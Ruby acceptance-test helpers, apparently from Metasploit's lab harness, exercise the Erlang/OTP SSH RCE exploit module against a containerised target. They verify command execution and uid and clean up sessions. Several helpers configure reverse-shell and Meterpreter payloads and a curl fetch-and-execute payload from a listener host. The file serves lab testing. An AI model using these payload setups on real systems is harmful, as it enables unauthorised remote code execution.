# frozen_string_literal: true

require 'base64'
require 'digest'
require 'English'
require 'json'
require 'open3'
require_relative 'settings'

module Acceptance
  # Console calls and native controls have separate journals and proof paths.
  module ErlangSsh
    OWNER = ErlangSshSettings::OWNER
    PAYLOADS = ErlangSshSettings::PAYLOADS

    def erlang_wait(seconds, &)
      wait_for_expect(seconds * 10, 0.1, &)
    end

    def erlang_record(name, row)
      File.open(File.join(target_runtime.fetch('artifacts'), name), 'a') { |file| file.puts(JSON.generate(row)) }
    end

    def erlang_json(expression)
      code = "puts 'ERLANG_JSON=' + (#{expression}).to_json"
      output = console_command("irb -e #{code.inspect}")
      rows = output.lines.grep(/^ERLANG_JSON=/)
      expect(rows.length).to eq(1), output
      JSON.parse(rows.first.delete_prefix('ERLANG_JSON='))
    end

    def erlang_native(phase)
      argv = ['python3', '-B', File.expand_path('native_probe.py', __dir__), ENV.fetch('MODULE_TARGET_RUNTIME'), ENV.fetch('ERLANG_SSH_PROFILE'), phase]
      output, status = Open3.capture2e(*argv)
      report = JSON.parse(output)
      erlang_record('native-controls.jsonl', report.merge('actual_exit' => status.exitstatus))
      expect(status.exitstatus).to eq(0), output
      expect(report.fetch('status')).to eq('passed')
      report
    end

    def erlang_sql(query)
      JSON.parse(target_exec('reporting_db', 'env', 'PGPASSWORD=module-target-framework-db-password', 'psql', '-h', '127.0.0.1', '-U', 'module_framework', '-d', 'module_targets', '-v', 'ON_ERROR_STOP=1', '-Atc', query))
    end

    def erlang_reports
      raise ArgumentError, 'Unexpected lab workspace' unless @workspace.match?(/\Aerlang_[0-9_]+\z/)

      rows = erlang_sql("SELECT coalesce(json_agg(row),'[]'::json) FROM (SELECT v.id,v.name,v.info,v.service_id,host(h.address) AS address FROM vulns v JOIN hosts h ON h.id=v.host_id JOIN workspaces w ON w.id=h.workspace_id WHERE w.name='#{@workspace}' ORDER BY v.id) row")
      erlang_record('vulnerability-snapshots.jsonl', workspace: @workspace, rows: rows)
      rows
    end

    def erlang_call(options = {}, action: 'run', service: 'target', reuse: false)
      output = nil
      options = { 'TARGET' => 1, 'PAYLOAD' => 'cmd/unix/generic', 'CMD' => 'printf unexpected_default', 'ConnectTimeout' => 3 }.merge(options)
      options.delete('CMD') unless options.fetch('PAYLOAD') == 'cmd/unix/generic'
      if reuse
        endpoint = target_runtime.fetch('module_endpoints').fetch(service)
        values = { 'RHOSTS' => endpoint.fetch('host'), 'RPORT' => endpoint.fetch('port'), 'VERBOSE' => true }.merge(options)
        output = console_command(action + ' ' + format_datastore_options(values), timeout: 75)
        expect(output).not_to match(/Exception|undefined method|Unknown command|Msf::OptionValidateError/)
      else
        output = run_target_module(OWNER, service, options, action: action, allow_errors: true, command_timeout: 75)
      end
      expect(output).not_to match(/Call stack:|Unknown datastore option|Payload executed successfully/)
      provenance = erlang_json('{check_source: active_module.method(:check).source_location, owner_sha256: Digest::SHA256.file("modules/exploits/linux/ssh/ssh_erlangotp_rce.rb").hexdigest}')
      expect(provenance.fetch('check_source').first).to end_with('/modules/exploits/linux/ssh/ssh_erlangotp_rce.rb')
      source = File.expand_path('../../../modules/exploits/linux/ssh/ssh_erlangotp_rce.rb', __dir__)
      expect(provenance.fetch('owner_sha256')).to eq(Digest::SHA256.file(source).hexdigest)
      erlang_record('owner-provenance.jsonl', provenance)
      output
    ensure
      erlang_record('owning-calls.jsonl', workspace: @workspace, action: action, service: service, options: options, same_selected_instance: reuse, output_base64: Base64.strict_encode64(output || console.all_data), wrapper_returned: !output.nil?)
    end

    def erlang_idle
      expect(erlang_json('framework.sessions.keys')).to eq([])
      expect(erlang_json('framework.jobs.keys')).to eq([])
    end

    def erlang_file_absent(path)
      target_exec('target', 'sh', '-c', 'test ! -e "$1" && test ! -L "$1"', 'sh', path)
    end

    def erlang_process_ids
      target_exec('target', 'sh', '-c', 'printf "%s\\n" /proc/[0-9]*').lines.map { |line| File.basename(line.strip).to_i }
    end

    def erlang_generic(kind, auto_check: true, allowed: @profile.fetch('affected'), options: {})
      2.times do |iteration|
        nonce = "erlang_#{@case}_#{iteration}"
        path = "/tmp/module-target-erlang/owner-#{@case}-#{iteration}"
        value = case kind
                when :quoted then nonce
                when :backslash then nonce + '\\path'
                when :utf8 then nonce + "_café_☃_🚀_e\u0301"
                else raise ArgumentError, 'Unexpected command case'
                end
        command = kind == :quoted ? "printf \"%s\" #{value} > #{path}" : "printf '%s' '#{value}' > #{path}"
        begin
          erlang_file_absent(path)
          values = { 'CMD' => command, 'AutoCheck' => auto_check, 'ForceExploit' => (@profile.fetch('check') == 'Detected') }.merge(options)
          output = erlang_call(values, reuse: iteration.positive?)
          observed = JSON.parse(File.readlines(File.join(target_runtime.fetch('artifacts'), 'effective-run-options.jsonl')).last)
          expect(observed.fetch('owner')).to eq(OWNER)
          actual = Base64.strict_decode64(observed.fetch('command_base64'))
          expect(actual).to eq(command.b)
          if allowed
            erlang_wait(10) { expect(target_exec('target', 'sh', '-c', 'if test -f "$1";then cat "$1";fi', 'sh', path)).to eq(value) }
            expect(target_exec('target', 'stat', '-c', '%u', path).strip).to eq(@profile.fetch('uid').to_s)
          else
            erlang_file_absent(path)
            expect(output).not_to match(/Payload executed successfully|session \d+ opened/i)
          end
          erlang_record('command-proofs.jsonl', case: @case, iteration: iteration, command: command, actual_command_base64: Base64.strict_encode64(actual), expected_base64: Base64.strict_encode64(value), path: path, allowed: allowed)
        ensure
          target_exec('target', 'rm', '-f', '--', path)
        end
        erlang_file_absent(path)
        erlang_idle
      end
    end

    def erlang_payload_options(index)
      options = { 'PAYLOAD' => PAYLOADS.fetch(index), 'LHOST' => listener_host, 'LPORT' => 4460 + index, 'WfsDelay' => 12 }
      if index.zero?
        options.merge!('FETCH_COMMAND' => 'CURL', 'FETCH_SRVHOST' => listener_host, 'FETCH_SRVPORT' => 8097, 'FETCH_WRITABLE_DIR' => '/tmp', 'FETCH_FILENAME' => 'erlang-lab-fetch', 'FETCH_URIPATH' => 'erlang-lab-fetch', 'FETCH_DELETE' => true)
      end
      options
    end

    def erlang_wait_session(owner, payload)
      identifier = nil
      erlang_wait(35) do
        sessions = erlang_json('framework.sessions.values.map { |s| {id:s.sid,type:s.type,owner:s.via_exploit,payload:s.via_payload} }')
        expect(sessions.length).to eq(1)
        expect(sessions.first).to include('owner' => owner, 'payload' => 'payload/' + payload)
        identifier = sessions.first.fetch('id')
        events = File.readlines(File.join(target_runtime.fetch('artifacts'), 'ready-sessions.jsonl')).map { |line| JSON.parse(line) }
        expect(events.map { |row| row.fetch('id') }).to include(identifier)
      end
      identifier
    end

    def erlang_use_session(identifier, owner, payload, label, before_pids)
      path = '/tmp/module-target-erlang/session-' + label
      marker = 'erlang_' + label.tr('-', '_')
      erlang_file_absent(path)
      proof = erlang_json("ErlangSshSessionControl.proof(framework,#{identifier},#{path.inspect},#{marker.inspect})")
      expect(proof).to include('owner' => owner, 'payload' => 'payload/' + payload, 'db_id' => be_a(Integer), 'pid' => be_a(Integer))
      expect(proof.fetch('type')).to eq(payload == PAYLOADS.first ? 'meterpreter' : 'shell')
      expect(target_exec('target', 'cat', path)).to eq(marker)
      expect(target_exec('target', 'stat', '-c', '%u', path).strip).to eq(@profile.fetch('uid').to_s)
      process = target_exec('target', 'cat', "/proc/#{proof.fetch('pid')}/status")
      expect(process[/^Uid:\s+(\d+)/, 1]).to eq(@profile.fetch('uid').to_s)
      expect(before_pids).not_to include(proof.fetch('pid'))
      ancestry = []
      pid = proof.fetch('pid')
      until pid <= 1 || before_pids.include?(pid)
        status = target_exec('target', 'cat', "/proc/#{pid}/status")
        ancestry << { pid: pid, status: status }
        pid = Integer(status[/^PPid:\s+(\d+)/, 1], 10)
      end
      erlang_record('session-proofs.jsonl', proof.merge('label' => label, 'process_status' => process, 'ancestry' => ancestry, 'before_pids' => before_pids, 'exact_file_bytes_base64' => Base64.strict_encode64(marker)))
      erlang_json("DruidSessionControl.exit_remote(framework,#{identifier})")
      ancestry.each do |row|
        erlang_wait(20) { expect(target_exec('target', 'sh', '-c', 'if test -e "$1";then printf PRESENT;else printf ABSENT;fi', 'sh', "/proc/#{row.fetch(:pid)}")).to eq('ABSENT') }
      end
      # Generic command shells do not consume EOF until their public close API.
      erlang_json("framework.sessions[#{identifier}]&.shell_close; true") if proof.fetch('type') == 'shell'
      erlang_wait(15) { expect(erlang_json('framework.sessions.keys')).to eq([]) }
      rows = erlang_sql("SELECT coalesce(json_agg(row),'[]'::json) FROM (SELECT id,closed_at FROM sessions WHERE id=#{proof.fetch('db_id')}) row")
      expect(rows).to contain_exactly(include('id' => proof.fetch('db_id'), 'closed_at' => be_a(String)))
      erlang_record('session-closures.jsonl', id: identifier, ancestry_pids: ancestry.map { |row| row.fetch(:pid) }, remote_processes_absent_before_local_close: true, database: rows)
    ensure
      target_exec('target', 'rm', '-f', '--', path) if path
    end

    def erlang_native_session(index)
      options = erlang_payload_options(index).merge('ExitOnSession' => false, 'ListenerTimeout' => 90)
      payload = options.fetch('PAYLOAD')
      console_command('back')
      console_command('use exploit/multi/handler')
      options.each { |key, value| expect(console_command("set #{key} #{value}")).not_to match(/\[-\]|Unknown datastore option/) }
      expect(console_command('run -j')).not_to include('[-]')
      jobs = erlang_json('framework.jobs.keys')
      expect(jobs.length).to eq(1)
      job = jobs.first
      generated = erlang_json("ErlangSshSessionControl.cached_command(framework.jobs.fetch(#{job.inspect}),#{payload.inspect})")
      command = Base64.strict_decode64(generated.fetch('command_base64'))
      erlang_record('native-payload-calibration.jsonl', generated.merge('phase' => 'generated', 'job' => job))
      command_path = "/tmp/module-target-erlang/native-payload-#{index}"
      erlang_file_absent(command_path)
      target_exec('target', 'sh', '-c', 'printf %s "$1" | base64 -d > "$2";chmod 600 "$2"', 'sh', Base64.strict_encode64(command), command_path)
      expect(target_exec('target', 'sha256sum', command_path).split.first).to eq(generated.fetch('command_sha256'))
      erlang_wait(15) { expect(erlang_listener_rows(options.fetch('LPORT'))).not_to be_empty }
      erlang_wait(15) { expect(erlang_listener_rows(options.fetch('FETCH_SRVPORT'))).not_to be_empty } if index.zero?
      before_pids = erlang_process_ids
      launched = target_exec('target', 'sh', '-c', 'nohup sh "$1" > "$1.log" 2>&1 < /dev/null &', 'sh', command_path)
      identifier = erlang_wait_session('exploit/multi/handler', payload)
      erlang_use_session(identifier, 'exploit/multi/handler', payload, "native-#{index}", before_pids)
      erlang_record('native-payload-calibration.jsonl', payload: payload, phase: 'used_and_remote_closed', command_sha256: Digest::SHA256.hexdigest(command), launch_output: launched, module_calls: 0)
    ensure
      failure = $ERROR_INFO
      begin
        if failure && identifier
          erlang_record('native-calibration-failure.jsonl', error: failure.class.name, message: failure.message, session: identifier)
          erlang_json("DruidSessionControl.exit_remote(framework,#{identifier})")
          erlang_json("framework.sessions[#{identifier}]&.kill; true")
        end
        erlang_json("framework.jobs.stop_job(#{job.inspect}); true") if job
        target_exec('target', 'rm', '-f', '--', command_path, command_path + '.log') if command_path
        erlang_wait(15) { expect(erlang_listener_rows(options.fetch('LPORT'))).to eq([]) } if options
        erlang_fetch_removed if index.zero?
        erlang_idle
      rescue RSpec::Expectations::ExpectationNotMetError, StandardError => e
        erlang_record('native-calibration-cleanup-failure.jsonl', error: e.class.name, message: e.message)
        raise unless failure
      end
    end

    def erlang_listener_rows(port)
      code = "require 'json';rows=%w[/proc/net/tcp /proc/net/tcp6].flat_map{|p|File.readlines(p).drop(1).map(&:split)};puts JSON.generate(rows.select{|r|r[3]=='0A'&&r[1].split(':').last.to_i(16)==#{port}})"
      JSON.parse(target_exec('framework', 'ruby', '-e', code))
    end

    def erlang_fetch_removed
      erlang_wait(20) { expect(target_exec('target', 'sh', '-c', 'if test -e /tmp/erlang-lab-fetch || test -L /tmp/erlang-lab-fetch;then printf PRESENT;else printf ABSENT;fi')).to eq('ABSENT') }
      erlang_wait(15) { expect(erlang_listener_rows(8097)).to eq([]) }
    end

    def erlang_owner_session(index, auto_check: true)
      2.times do |iteration|
        options = erlang_payload_options(index).merge('TARGET' => index, 'AutoCheck' => auto_check, 'ForceExploit' => (@profile.fetch('check') == 'Detected'))
        options['CMD'] = nil
        before_pids = erlang_process_ids
        erlang_call(options, action: 'run -z', reuse: iteration.positive?)
        identifier = erlang_wait_session(OWNER, options.fetch('PAYLOAD'))
        erlang_use_session(identifier, OWNER, options.fetch('PAYLOAD'), "owner-#{@case}-#{iteration}", before_pids)
        erlang_fetch_removed if index.zero?
        erlang_idle
      end
    end

    def erlang_resources
      rows = %w[target framework reporting_db].to_h do |service|
        counters = %w[memory.events pids.events].to_h do |name|
          values = target_exec(service, 'cat', '/sys/fs/cgroup/' + name).lines.to_h do |line|
            key, value = line.split
            [key, Integer(value, 10)]
          end
          [name, values]
        end
        [service, counters]
      end
      erlang_record('resource-counters.jsonl', rows)
      rows.each_value do |counters|
        %w[oom oom_kill oom_group_kill].each { |key| expect(counters.fetch('memory.events').fetch(key, 0)).to eq(0) }
        expect(counters.fetch('pids.events').fetch('max')).to eq(0)
      end
    end
  end
end
